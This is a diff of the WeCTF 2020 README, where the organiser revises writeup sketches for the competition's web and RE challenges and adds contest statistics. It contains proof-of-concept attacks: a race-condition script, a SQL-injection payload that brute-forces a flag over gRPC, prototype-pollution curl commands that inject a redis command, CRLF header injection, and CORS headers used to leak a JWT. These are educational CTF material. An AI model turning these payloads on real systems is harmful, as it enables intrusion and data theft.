@@ -1,6 +1,6 @@
 # WeCTF 2020
 
-Thank you all for participating! 
+Thank you all for participating! This README contains my writeup sketches. You can also share your writeup on CTFtime.
 
 ### Run Challenges Locally
 
@@ -31,50 +31,50 @@ server {
         server_name corbra.cf;
         location / {
         	proxy_pass http://localhost:1000/;
-    		}
+    	}
 }
 server {
         listen 80;
         server_name customer.*;
         location / {
         	proxy_pass http://localhost:1001/;
-    		}
+    	}
 }
 server {
         listen 80;
         server_name kvaas.*;
         location / {
         	proxy_pass http://localhost:1003/;
-    		}
+    	}
 }
 server {
         listen 80;
         server_name na1.*;
         location / {
         	proxy_pass http://localhost:1005/;
-    		}
+    	}
 }
 server {
         listen 80;
         server_name na2.*;
         location / {
         	proxy_pass http://localhost:1006/;
-    		}
+    	}
 }
 server {
         listen 80;
         server_name na3.*;
         location / {
         	proxy_pass http://localhost:1007/;
-    		}
+    	}
 }
 server {
         listen 80;
         server_name url.*;
         location / {
         	proxy_set_header Host $host;
-					proxy_pass http://localhost:1008/;
-    		}
+		proxy_pass http://localhost:1008/;
+    	}
 }
 ```
 
@@ -107,7 +107,7 @@ Search on Google and you would find [this](https://www.housing.ucsb.edu/dining/d
 
 *Description: Write your diary on Shou's note app so he can eavesdrop every single byte of it!!!*
 
-After login, visit http://na1.w-va.cf/note/1
+After login, visit http://host/note/1
 
 ### Writeup - RE
 
@@ -123,14 +123,14 @@ The code is obfuscated with YAK Pro. You can find unobfuscated one in this repo.
 
 *Description: Be as fast as possible to fast!*
 
-No lock presents , so PoC:
+No lock presents in db queries. PoC:
 
 ```python
 from requests import post
 from multiprocessing import *
 import time
 def f():
-    post("http://faster.w-va.cf/buy/1", headers={
+    post("http://host/buy/1", headers={
         "cookie": "token=[YOUR TOKEN]"
     })
 for i in range(20):
@@ -145,7 +145,7 @@ time.sleep(2)
 
 *Description: Shou just told admins in his company not to click any link sent by unknowns but they are just too ignorant and assume Chrome is so secure…*
 
-You can simply generate payload with any existing tool.
+You can simply generate payload with any existing tool for CSRF profiling.
 
 ### Writeup - lightSequel (SQL Injection)
 
@@ -162,13 +162,13 @@ Code that causes SQL Injection:
 Where(fmt.Sprintf("user_id = (SELECT id FROM users WHERE token = '%s')", userToken)).
 ```
 
-PoC:
+PoC (bruteforce each character):
 
 ```go
-md := metadata.Pairs("user_token", "1' OR (SELECT COUNT(*) FROM flags WHERE flag LIKE '%a%') > 0))/*")
-	ctx = metadata.NewOutgoingContext(context.Background(), md)
-	var header, trailer metadata.MD
-	r, err := c.GetLoginHistory(ctx, &pb.SrvRequest{}, grpc.Header(&header), grpc.Trailer(&trailer))
+md := metadata.Pairs("user_token", "1' OR (SELECT COUNT(*) FROM flags WHERE flag LIKE '%we{%') > 0))/*")
+ctx = metadata.NewOutgoingContext(context.Background(), md)
+var header, trailer metadata.MD
+r, err := c.GetLoginHistory(ctx, &pb.SrvRequest{}, grpc.Header(&header), grpc.Trailer(&trailer))
 ```
 
 ### Writeup - KVaaS (Prototype Pollution)
@@ -182,7 +182,7 @@ curl http://host/set?user_token=__proto__&key=redis_set&value=[YOUR COMMAND];
 curl -X PUT http://host/backup
 ```
 
-### Writeup - Note App 2 (XFS)
+### Writeup - Note App 2 (CSRF + XFS)
 
 *7 solves / 1635 pts*
 
@@ -256,7 +256,7 @@ test3.html
 
 *Description: PHP is the most production-ready and CTF-challenge-ready language huh?*
 
-Generate POP chain to pwn `/api/Utils.inc:26` as to insert HTML without sanitization.
+Make POP chain to pwn `/api/Utils.inc:26` so as to insert HTML without sanitization.
 
 ```php
 <?php
@@ -273,7 +273,7 @@ namespace a{
 }
 ```
 
-After getting XSS works, bypass by using an iframe and control the hash.
+After getting XSS works, bypass sandbox by using an iframe and control the hash.
 
 ### Writeup - urlLongener (CRLF Injection + CORS Misconf)
 
@@ -289,18 +289,21 @@ curl http://host/redirect?location=abc\r\na: b
 
 Then get admin token:
 
-This line `controllers.py:L66` ensures no XSS code could be injected. However, we can inject headers like following, so any website can get the whole response from chall website:
+This line `controllers.py:L66` ensures no XSS code could be injected. However, we can inject headers like following, so any website can get the whole response, including JWT, from chall website:
 
 ```
 Access-Control-Allow-Credential: true
 Access-Control-Allow-Origin: *
 ```
 
-Then fake your IP with `X-Forwarded-For` and all set : )
+Then fake your IP with `X-Forwarded-For` and all set : )   
+^ It is actually not correct as pointed out in writeup by [@dshynkev](https://github.com/dshynkev/ctf-writeups/tree/master/2020/wectf/url_longener). The reason is this app is served behind NGINX during the CTF, so all requests' IP is 127.0.0.1. My bad : (
 
 ### Writeup - CORBra (XS-Search)
 
 *1 solve / 2000 pts*
+
+🎉 Team `lsof -i:80` is the only team that solved this completely. Good Job!!
 
 *Description: Shou stores one flag in his fancy CORBra Vault.  Hint 1: You may need CVE-2020-6442*
 
@@ -325,21 +328,25 @@ Note that CORBra-- is considered to be solved if participants reach this step an
 Then, use following CVE to conduct XS-Search: https://bugs.chromium.org/p/chromium/issues/detail?id=1013906. @posix and @DayDun manage to reproduce part of this. One key factor to concern is that the algorithm is like
 
 ```
-what you can get = bytes of requests without cookie + random padding - (bytes of requests with cookie + same random padding)
+what you can get = 
+bytes of requests without cookie + bytes of random padding - 
+(bytes of requests with cookie + bytes of same random padding)
 ```
 
 ### Cliche
 
 Data:
 
-* There are 690+ teams from 16+ different countries registered their account. 
-* There are up to 251+ teams solved at least one challenge. 
+* There are 712 teams from 26 different countries registered their account. 
+* Infrastructure has served 2.8TB requests. 
+* There are up to 257 teams solved at least one challenge. 
 * Congrats to `st9846` `UWCTF`, `lsof -i:80`, which are respectively first, second, and third place. 
 
 What have I screwed up:
 
 * KVaaS: I did not proofread my JS code carefully, leaving two small typos. Moreover, I forgot to test it (I really put it on my note) remotely, leaving the flag file empty at the beginning due to Docker not passing args and read-only system issues.
-* urlLongener: I did not notice the request altering caused by NGINX as well as AJAX, which creates ambiguity on the source code. It fixed after 13PM PDT. 
-
 I am super sorry for the inconvinience I have created : (
+* urlLongener: I did not notice the request altering caused by NGINX as well as AJAX, which creates ambiguity on the source code. It is fixed after 13PM PDT. 
+* Quota in Google Cloud prevented me from creating more than 32 cores. So, I have to migrate some instance to another account and pay for them : (
+
 
